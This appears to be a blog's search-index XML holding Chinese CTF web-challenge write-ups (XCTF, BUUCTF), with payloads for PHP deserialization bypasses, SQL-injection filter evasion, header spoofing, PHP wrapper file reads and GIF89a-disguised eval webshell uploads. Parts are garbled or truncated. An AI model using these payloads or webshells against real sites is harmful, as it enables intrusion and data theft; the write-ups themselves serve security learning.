<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>攻防世界</title>
    <url>/2021/12/14/123456/</url>
    <content><![CDATA[<h1 id="NaNNaNNaNNaN-Batman"><a href="#NaNNaNNaNNaN-Batman" class="headerlink" title="NaNNaNNaNNaN-Batman"></a>NaNNaNNaNNaN-Batman</h1><p>这一道题没有给环境，打开附件看的我一脸懵，还还以为是加密了，但想一想又不像是被加密了。然后看到了熟悉的标签，我还以为是xss，但是我又不知道该从何下手。于是去看了wp,感觉自己好懒，函数懒得去搜，果然还是函数出了问题。</p>
<script>_='function $(){e=getEleById("c").value;length==16^be0f23233ace98aa$c7be9){tfls_aie}na_h0lnrg{e_0iit\'_ns=[t,n,r,i];for(o=0;o<13;++o){    [0]);.splice(0,1)}}}    \'<input id="c">< onclick=$()>Ok</>\');delete _var ","docu.)match(/"];/)!=null=["    write(s[o%4]buttonif(e.ment';for(Y in $='    ')with(_.split($[Y]))_=join(pop());eval(_)</script>

<p>问题就出在eval这个函数身上，eval(string)函数可计算某个字符串，并执行其中的JavaScript代码。<img src="/2021/12/14/123456/2173462-20210112131239936-1971780407.png" class="" title="img"></p>
<p>他把$()当作字符串执行而导致乱码，alert（）可以把$()中的内容作为弹窗显示出来，显示源代码。</p>
<p>因为是javascript,因此可以选择在浏览器中打开，让其显示执行结果，附件显示出来一个输入框，修改后在浏览器中打开，显示出来的是源代码，复制整理后得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function $()</span><br><span class="line">&#123;</span><br><span class="line">    var e=document.getElementById(&quot;c&quot;).value;</span><br><span class="line">if(e.length==16)</span><br><span class="line">if(e.match(/^be0f23/)!=null)</span><br><span class="line">if(e.match(/233ac/)!=null)</span><br><span class="line">if(e.match(/e98aa$/)!=null)</span><br><span class="line">if(e.match(/c7be9/)!=null)</span><br><span class="line">&#123;var t=[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e&#125;&quot;];</span><br><span class="line">var n=[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];</span><br><span class="line">var r=[&quot;g&#123;&quot;,&quot;e&quot;,&quot;_0&quot;];</span><br><span class="line">var i=[&quot;it&#x27;&quot;,&quot;_&quot;,&quot;n&quot;];</span><br><span class="line">var s=[t,n,r,i];</span><br><span class="line">for(var o=0;o&lt;13;++o)&#123;document.write(s[o%4][0]);</span><br><span class="line">s[o%4].splice(0,1)&#125;&#125;&#125;document.write(&#x27;&lt;input id=&quot;c&quot;&gt;&lt;button </span><br><span class="line">onclick=$()&gt;Ok&lt;/button&gt;&#x27;);</span><br><span class="line">delete _</span><br></pre></td></tr></table></figure>

<p>又要考察函数了，这次考察的是splice() </p>
<img src="/2021/12/14/123456/2173462-20210112131256987-1462219035.png" class="" title="img">

<p>输入满足条件的e使其显示出来</p>
<p>四个正则匹配</p>
<p>/^be0f23/ ———- ^ 头部匹配</p>
<p>/233ac/ ———- 中间匹配</p>
<p>/e98aa$/ ———- $ 尾部匹配</p>
<p>/c7be9/ ———- 中间匹配</p>
<p>构造字符串e <strong>be0f233ac7be98aa</strong></p>
<p>然后在输入框中输入即可获得flag</p>
<h1 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h1><p>class xctf{<br>public $flag = ‘111’;<br>public function __wakeup(){<br>exit(‘bad requests’);<br>}<br>?code=</p>
<p>exit()这个函数和die()这个函数差不多，输出一条脚本之后，就退出当前脚本。当然不能让他退出呀，想办法让他绕过wakeup(),这个函数。</p>
<?php
class xctf{
public $flag = '111';
public function __wakeup(){
exit('bad requests');
}
}
$c=new xctf();
printf(serialize($c));
?>

<p>O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;}</p>
<p>绕过后O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}</p>
<p>？code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}</p>
<p>获得flag</p>
<h1 id="python-template-injection"><a href="#python-template-injection" class="headerlink" title="_python_template_injection"></a>_python_template_injection</h1><p>????????python????????????????????????<br>???????&lt;type ?object?&gt;?&gt;?????&gt;?????????????????</p>
<p><strong>class</strong>  ?????????<br><strong>mro</strong>    ?????????????????????????????????<br><strong>base</strong>   ???????????  // <strong>base</strong>?<strong>mro</strong>?????????</p>
<p><strong>subclasses</strong>   ???????????????????????????????????<br><strong>init</strong>  ???????<br><strong>globals</strong>  ???????????????</p>
<h1 id="ctfshow-web-3"><a href="#ctfshow-web-3" class="headerlink" title="ctfshow web 3"></a>ctfshow web 3</h1><p>/?id=2 union select * from article where id=1000</p>
<p>?????????????????????????</p>
<h1 id="ctfshow-web-4"><a href="#ctfshow-web-4" class="headerlink" title="ctfshow web 4"></a>ctfshow web 4</h1><p>/or|-|\|/|\*|&lt;|&gt;|!|x|hex|(|)|+|select/i”</p>
<p>?select?????? /?id=2 || id=1000</p>
<p><strong>intval()????????????????????????????????????</strong></p>
<p><strong>????????????????</strong></p>
<p>|??????</p>
<h1 id="ctfshow-web-5"><a href="#ctfshow-web-5" class="headerlink" title="ctfshow web 5"></a>ctfshow web 5</h1><p>/?id=~~1000</p>
<p>?????payload?????get???????????????????? ?~~1000? ???????intval()???????? 0</p>
<p>?select?????????????id=1000</p>
]]></content>
  </entry>
  <entry>
    <title>buuctf</title>
    <url>/2022/01/16/buuctf/</url>
    <content><![CDATA[<h1 id="buuctf-http"><a href="#buuctf-http" class="headerlink" title="buuctf http"></a>buuctf http</h1><p>考察http,感觉多多少少有点忘记了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">It doesn&#x27;t come from &#x27;https://Sycsecret.buuoj.cn&#x27;</span><br></pre></td></tr></table></figure>

<p>提示我们抓包之后，修改服务器</p>
<p><strong>服务器伪造</strong></p>
<p>referer: <a href="https://sycsecret.buuoj.cn/">https://Sycsecret.buuoj.cn</a></p>
<p><strong>修改浏览器</strong></p>
<p>发包之后又提示我们要用Syclover的浏览器，修改浏览器user-agent</p>
<p>ip<strong>伪造</strong></p>
<p>No!!!you can only read this locally!!!</p>
<p>提示我们要用本地Ip链接</p>
<p>X-Forwarded-For: 127.0.0.1</p>
<h1 id="buuctf-upload"><a href="#buuctf-upload" class="headerlink" title="buuctf upload"></a>buuctf upload</h1><p>文件上传漏洞，尝试着上传个一句话木马，但是弹窗要求文件类型为image，抓包后在content-type修改为image/jpeg,然后发包，在响应文中看到No!php!    可能是黑名单过滤，因此可以尝试</p>
<p>基于文件后缀名验证方式的分类：<br>1、基于白名单验证：只针对白名单中有的后缀名，文件才能上传成功。<br>2、基于黑名单验证：只针对黑名单中没有的后缀名，文件才能上传成功。<br>这一关禁止.jsp、.php、.asp、.aspx后缀名的文件上传。</p>
<p>但是可以其他后缀名嘛，例如php1、php2、phtml、php5等等。</p>
<p>在尝试之后发现phtml可行</p>
<p>然后上传文件类型为phtml的一句话木马，抓包后修改文件类型为image/jpeg,然后发包，响应文件中提示不能是&lt;?,然后考虑将文件内容修改为</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">GIF89a? <span class="tag">&lt;<span class="name">scrit</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span>eal($_REUEST[1])</span><br></pre></td></tr></table></figure>

<p>现在需要知道图片的保存路径了。<br>一般都是upload/filename</p>
<h1 id="ACTF2020-新生赛-Upload1"><a href="#ACTF2020-新生赛-Upload1" class="headerlink" title="[ACTF2020 新生赛]Upload1"></a>[ACTF2020 新生赛]Upload1</h1><p>上传一句话木马，抓包，发现没抓上，一直以为是我操作的问题，后来看了wp知道是没有上传上，然后就上传一个文件后缀为jpg的一句话木马，发现上传成功，但是蚁剑要求的是php文件，与市场是将文件后缀修改为php,但是没有上传成功，然后又尝试了phtml，成功。</p>
<p>.phtml文件告诉网络服务器，这些文件是由服务器生成的带有动态内容的html文件，就像浏览器中的.php文件表现一样。</p>
<h1 id="RoarCTF-2019-Easy-Calc1-php字符串解析漏洞"><a href="#RoarCTF-2019-Easy-Calc1-php字符串解析漏洞" class="headerlink" title="[RoarCTF 2019]Easy Calc1    php字符串解析漏洞"></a>[RoarCTF 2019]Easy Calc1    php字符串解析漏洞</h1><p>打开是一个计算器，感觉没什莫用，尝试了一下ssti,不是，直接看源代码，</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--I&#x27;ve set up WAF to ensure security.--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    $(<span class="string">&#x27;#calc&#x27;</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        $.ajax(&#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">url</span>:<span class="string">&quot;calc.php?num=&quot;</span>+<span class="built_in">encodeURIComponent</span>($(<span class="string">&quot;#content&quot;</span>).val()),</span></span><br><span class="line"><span class="javascript">            <span class="attr">type</span>:<span class="string">&#x27;GET&#x27;</span>,</span></span><br><span class="line"><span class="javascript">            <span class="attr">success</span>:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                $(<span class="string">&quot;#result&quot;</span>).html(<span class="string">`&lt;div class=&quot;alert alert-success&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="javascript">            &lt;strong&gt;答案:&lt;/strong&gt;<span class="subst">$&#123;data&#125;</span></span></span></span><br><span class="line"><span class="string"><span class="javascript">            &lt;/div&gt;`</span>);</span></span><br><span class="line"><span class="javascript">            &#125;,</span></span><br><span class="line"><span class="javascript">            <span class="attr">error</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                alert(<span class="string">&quot;这啥?算不来!&quot;</span>);</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125;)</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">    &#125;)</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()),</span><br></pre></td></tr></table></figure>

<p>根据这个提示查看文件calc.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现绕过了许多东西</p>
<!--I've set up WAF to ensure security.-->

<p>既要绕过防火墙，又要绕过黑名单，通过num来进行传参</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump（）  打印变量相关信息</span><br><span class="line">chr()         返回指定的字符</span><br><span class="line">scandir()     列出指定文件和目录</span><br><span class="line">file_get_contents()  讲整个文件读入一个字符串</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>利用php的解析特性，绕过防火墙检测。因为php解析GET POST请求的时候会自动过滤掉空格，而防火墙不会。</p>
<p>为什么要在num前加一个空格？</p>
<p>答：假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">? num=var_dump(scandir(chr(<span class="number">47</span>)))</span><br><span class="line">    ?num=file_get_contents(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">49</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>).chr(<span class="number">103</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="极客大挑战-2019-PHP1"><a href="#极客大挑战-2019-PHP1" class="headerlink" title="[极客大挑战 2019]PHP1"></a>[极客大挑战 2019]PHP1</h1><p>扫描发现压缩包，打开</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>反序列化，关键是绕过</p>
<p>绕过_wakeup(),private</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span>=<span class="keyword">new</span> Name(<span class="string">&#x27;admin&#x27;</span>,<span class="number">100</span>);<span class="comment">//传入变量</span></span><br><span class="line">  var_dump(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>序列化后是这样的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.调用unserialize()时会自动调用魔法函数wakeup(),可以通过改变属性数绕过，把后面的2改为3或以上即可Name</p>
<p>然后url识别不了，改为”%22</p>
<p>因为成员（属性）是<strong>private</strong>，所以要在类名和成员名前加这个url编码是空的意思。 因为生产序列化时不会把这个也输出。**%00**空</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?select=O:4:%22Name%22:3:&#123;s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="极客大挑战-2019-BabySQL1"><a href="#极客大挑战-2019-BabySQL1" class="headerlink" title="[极客大挑战 2019]BabySQL1"></a>[极客大挑战 2019]BabySQL1</h1><p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘1,2,3#’’ at line 1</p>
<p>可知union select被过滤，uunionnion,sselectelect可绕过</p>
<p>后来操作可知or也被过滤，oorr可绕过</p>
<p>根据报错提示知道哪些被过滤了，双写绕过即可</p>
<h1 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h1><p>扫描</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="弱比较"><a href="#弱比较" class="headerlink" title="弱比较"></a>弱比较</h2><p><a href="https://www.cnblogs.com/Mrsm1th/p/6745532.html">php 弱类型总结 - Mrsm1th - 博客园 (cnblogs.com)</a></p>
<h1 id="弱类型"><a href="#弱类型" class="headerlink" title="弱类型"></a>弱类型</h1><p><a href="https://www.cnblogs.com/Mrsm1th/p/6745532.html">php 弱类型总结 - Mrsm1th - 博客园 (cnblogs.com)</a></p>
<p>数字太长绕过方式有：</p>
<p>money[]=1</p>
<p>科学数字计数法</p>
<h1 id="BJDCTF2020-Easy-MD51"><a href="#BJDCTF2020-Easy-MD51" class="headerlink" title="[BJDCTF2020]Easy MD51"></a>[BJDCTF2020]Easy MD51</h1><p>打开后只有一个输入框，但是根据题目，考点不应该是sql注入，但还是尝试了一下，果然不是。</p>
<p>然后看了wp，抓包之后发包，得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure>



<p>然后网上搜到md5($pass,true)的漏洞，得知ffifdyop，·在本地环境试验ffifdyop，输出的开头是’or’6xxxxxx<br>在数据库语句里就构成了select * from ‘admin’ where password= ‘’or’6xxxxxx ’ 相当于 password= ‘’ or 1 变成永真，</p>
<p>后面只要是数字，就可以使他永远为真。后面，MD5绕过即可</p>
<h1 id="ZJCTF-2019-NiZhuanSiWei1"><a href="#ZJCTF-2019-NiZhuanSiWei1" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei1"></a>[ZJCTF 2019]NiZhuanSiWei1</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里涉及三个参数，text,file,password</p>
<p>其中text的内容为welcome to the zjctf，可以利用伪协议data://， 用户写入的数据作为输入流</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data://text/plain,welcome to the zjctf</span><br></pre></td></tr></table></figure>

<p>访问useless.php文件的时候，发现读不出来，然后尝试使用伪协议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123; </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>反序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;flag.php&quot;</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123; </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$password</span>=<span class="keyword">new</span> Flag();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$password</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>不理解参数为什莫要传入到最上面，而不是在$password=new Flag();中，传入参数</p>
<h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><p><a href="https://blog.csdn.net/cosmoslin/article/details/120695429">(43条消息) PHP伪协议详解_cosmoslin的博客-CSDN博客_php 伪协议详解</a></p>
<h1 id="极客大挑战-2019-Upload-1-文件上传"><a href="#极客大挑战-2019-Upload-1-文件上传" class="headerlink" title="[极客大挑战 2019]Upload 1(文件上传)"></a>[极客大挑战 2019]Upload 1(文件上传)</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用GIF89a &lt;script language=</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="SUCTF-2019-CheckIn1"><a href="#SUCTF-2019-CheckIn1" class="headerlink" title="[SUCTF 2019]CheckIn1"></a>[SUCTF 2019]CheckIn1</h1><p>上传.php文件，但是提示后缀名错误。于是上传.jpg类型的文件，但是又提示&lt;?不允许，于是上传内容为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;s lnguage=&quot;php&quot;&gt;eval($_GT[1]);</span><br></pre></td></tr></table></figure>

<p>但是又提示exif_imagetype:not image!</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exif_imagetype</span><br><span class="line">(PHP 4 &gt;= 4.3.0, PHP 5, PHP 7, PHP 8)</span><br><span class="line"></span><br><span class="line">exif_imagetype — 判断一个图像的类型</span><br><span class="line"></span><br><span class="line">说明</span><br><span class="line">exif_imagetype ( string $filename ) : int</span><br><span class="line"></span><br><span class="line">exif_imagetype() 读取一个图像的第一个字节并检查其签名。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>说明后端会截取文件内容的一部分进行判断</p>
<p>因此可以采用<strong>GIF89a图片头文件欺骗，</strong></p>
<p>于是上传</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a?</span><br><span class="line">&lt;script la</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eal($_GET[&#x27;cmd&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

